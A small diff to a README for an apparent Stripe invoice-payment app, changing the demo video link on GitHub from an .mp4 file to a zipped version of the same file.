@@ -44,7 +44,7 @@ The app integrates with Stripe to make invoice payment. Find more details - http
 
 ###Video
 
-Link to Video - https://github.com/krunalsshah/paymentgo/blob/master/stripe-payment-demo.mp4
+Link to Video - https://github.com/krunalsshah/paymentgo/blob/master/stripe-payment-demo.mp4.zip
 
 ###Extensions
 	-   Unit Test
